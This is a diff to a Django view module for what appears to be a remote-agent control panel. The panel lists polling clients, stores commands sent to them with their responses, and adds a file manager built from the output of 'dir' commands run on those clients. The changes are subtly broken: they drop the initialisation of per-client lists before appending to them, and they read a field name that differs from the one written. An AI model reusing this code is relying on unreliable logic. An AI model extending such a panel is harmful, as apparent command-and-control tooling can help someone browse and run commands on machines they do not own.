@@ -67,17 +67,7 @@ class IndexView(View):
         form = UploadsForm()
         client_list = {}
         commands_list = {}
-
-        for client in clients:
-            commands = Commands.objects.filter(receiver=client)
-            commands_list[client.id_name] = []
-            for command in commands:
-                commands_list[client.id_name].append({
-                    'command': command.command,
-                    'response': command.response if command.response else '',
-                    'name': command.command.split(' ')[0],
-                    'time': command.time_passed()
-                })
+        file_manager_list = {}
 
         for client in clients:
             client_list[client.id_name] = {
@@ -91,13 +81,36 @@ class IndexView(View):
                 'last_online': client.last_online(),
                 'interval': client.interval,
             }
+
+            commands = Commands.objects.filter(receiver=client)
+            for command in commands:
+                commands_list[client.id_name].append({
+                    'command': command.command,
+                    'response': command.response if command.response else '',
+                    'name': command.command.split(' ')[0],
+                    'time': command.time_passed()
+                })
+
+            file_manager = FileManager.objects.filter(client=client)
+            for fm in file_manager:
+                file_manager_list[client.id_name].append({
+                    'name': fm.name,
+                    'parent': fm.parent,
+                    'files': fm.get_files(),
+                    'folders': fm.get_folders(),
+                    'is_drive': fm.is_drive,
+                })
+
+
         json_data = json.dumps(client_list)
         commands_json = json.dumps(commands_list)
+        file_manager_json = json.dumps(file_manager_list)
         context = {
             'json_data': json_data,
             'form': form,
             'clients': clients,
             'commands_json': commands_json,
+            'file_manager_json': file_manager_json,
         }
         return render(request, 'server_side/index.html', context)
 
@@ -185,6 +198,17 @@ class SendCommand(View):
             cmd.is_executed = True
             response = re.sub(r'\n,id\s*=\s*(\d+)', '', body).strip()
             cmd.response = response
+            if 'dir' in cmd.command:
+                parent, name = '', ''
+                match = re.match(r"^(.*)[/\\]([^/\\]+)[/\\]([^/\\]+)$", cmd.command)
+                if match:
+                    parent, name = match.group(2), match.group(3)
+
+                fm = FileManager.objects.create(client=agent, parent_name=parent,
+                                           name=name)
+                fm.set_files_folders(response)
+                fm.save()
+
             cmd.save()
             return HttpResponse("Command executed successfully.", status=200)
 
